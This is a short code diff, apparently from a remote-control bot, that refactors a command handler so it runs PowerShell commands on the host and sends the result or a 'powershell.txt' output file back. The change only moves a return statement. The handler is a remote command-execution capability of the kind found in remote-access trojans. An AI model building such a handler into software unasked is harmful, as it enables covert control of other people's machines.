@@ -4256,10 +4256,10 @@ STATUS: {"ENABLED" if n[7] else "DISABLED"}\n
 
                 if not output:
                     send(f'powershell command is executed ({command}) [+]' if powershell(command) else f'failed to execute powershell command ({command}) [-]')
-                    return
                 else:
                     send(powershell(command, output=True), doc='powershell.txt')
-                    return
+                    
+                return
         case 'time':
             if args == '-g':
                 send(get_date()[0])
